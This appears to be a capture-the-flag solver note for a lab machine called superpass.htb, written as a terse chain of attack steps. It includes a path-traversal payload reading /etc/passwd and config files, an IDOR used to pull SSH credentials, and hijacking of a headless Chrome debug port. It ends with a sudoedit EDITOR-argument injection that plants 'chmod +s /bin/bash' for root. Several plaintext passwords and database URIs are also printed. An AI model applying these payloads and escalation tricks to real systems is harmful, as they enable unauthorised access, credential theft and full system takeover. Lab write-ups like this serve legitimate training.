## Solver
```
LFI on Export Feature /download?fn=../../../../etc/passwd
Found web root path on nginx error.log
Read /app/app/superpass/views/vault_views.py, found IDOR on /row/<id>
Get Corum SSH Password using IDOR
Corum:5db7caa1d13cc37c9fc2

Found process
runner     19407  0.2  3.2 1184735680 127488 ?   Sl   07:08   0:01                          |       _ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=19351 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1682054965917877 --launch-time-ticks=5916737567 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,17872344862098802304,15461700840430374261,131072 --disable-features=PaintHolding

SSH Port Forwarding Chrome Debug
ssh corum@superpass.htb -L 41829:superpass.htb:41829

Privesc to user edwards:
In chrome browser:
chrome://inspect/#devices
Discover Network Targets -> configure -> add localhost:41829

Remote Target:
Monitor target process, if contains test.superpass.htb/vault, inspect it
found password edwards on that vault

edwards:d07867c6267dcb5df0af

Check sudo -l on user edwards

sudoedit vulnerable:
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/



sudo -u dev_admin sudoedit /app/config_test.json

"SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"

sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
edwards:1d7ffjwrx#$d6qn!9nndqgde4

config_prod.json is www-data
Read config_prod.json using LFI
"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"

PRIVESC to root:
EDITOR='nano -- /app/venv/bin/activate' sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt

add bash -c "chmod +s /bin/bash"

```
